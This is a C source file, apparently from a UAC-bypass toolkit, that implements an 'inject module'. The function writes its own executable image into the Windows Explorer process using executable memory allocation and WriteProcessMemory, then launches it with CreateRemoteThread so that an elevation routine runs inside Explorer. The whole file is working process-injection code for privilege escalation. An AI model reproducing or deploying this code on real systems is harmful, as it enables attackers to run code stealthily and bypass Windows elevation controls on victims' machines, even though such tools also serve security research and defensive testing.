/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       INJECT.C
*
*  VERSION:     1.30
*
*  DATE:        30 Mar 2015
*
*  Inject module.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmInject
*
* Purpose:
*
* Inject data and run remote thread inside Explorer process.
*
*/
BOOL ucmInjectExplorer(
	_In_ LPVOID ElevParams,
	_In_ LPVOID ElevatedLoadProc
	)
{
	BOOL					cond = FALSE, bResult = FALSE;
	DWORD					c;
	HANDLE					hProcess = NULL, hRemoteThread = NULL;
	HINSTANCE               selfmodule = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER       pdosh = (PIMAGE_DOS_HEADER)selfmodule;
	PIMAGE_FILE_HEADER      fh = (PIMAGE_FILE_HEADER)((char *)pdosh + pdosh->e_lfanew + sizeof(DWORD));
	PIMAGE_OPTIONAL_HEADER  opth = (PIMAGE_OPTIONAL_HEADER)((char *)fh + sizeof(IMAGE_FILE_HEADER));
	LPVOID                  remotebuffer = NULL, newEp, newDp;
	SIZE_T                  NumberOfBytesWritten = 0;

	if (
		(ElevParams == NULL) ||
		(ElevatedLoadProc == NULL)
		)
	{
		return bResult;
	}

	do {
		//
		// Open explorer handle with maximum allowed rights.
		//
		hProcess = supGetExplorerHandle();
		if (hProcess == NULL) {
			OutputDebugString(TEXT("[UCM] Cannot open target process."));
			break;
		}

		//
		// Allocate buffer in target process and write itself inside
		//
		remotebuffer = VirtualAllocEx(hProcess, NULL, (SIZE_T)opth->SizeOfImage,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (remotebuffer == NULL) {
			OutputDebugString(TEXT("[UCM] Cannot allocate memory in target process."));
			break;
		}
		if (!WriteProcessMemory(hProcess, remotebuffer, selfmodule, opth->SizeOfImage, &NumberOfBytesWritten)) {
			OutputDebugString(TEXT("[UCM] Cannot write to the target process memory."));
			break;
		}

		//
		// Calculate new entry point offset and run remote thread with it.
		//
		newEp = (char *)remotebuffer + ((char *)ElevatedLoadProc - (char *)selfmodule);
		newDp = (char *)remotebuffer + ((char *)ElevParams - (char *)selfmodule);

		hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, newEp, newDp, 0, &c);
		bResult = (hRemoteThread != NULL);
		if (bResult) {
			CloseHandle(hRemoteThread);
		}

	} while (cond);

	//
	// Close target process handle.
	//
	if (hProcess != NULL) {
		CloseHandle(hProcess);
	}
	return bResult;
}
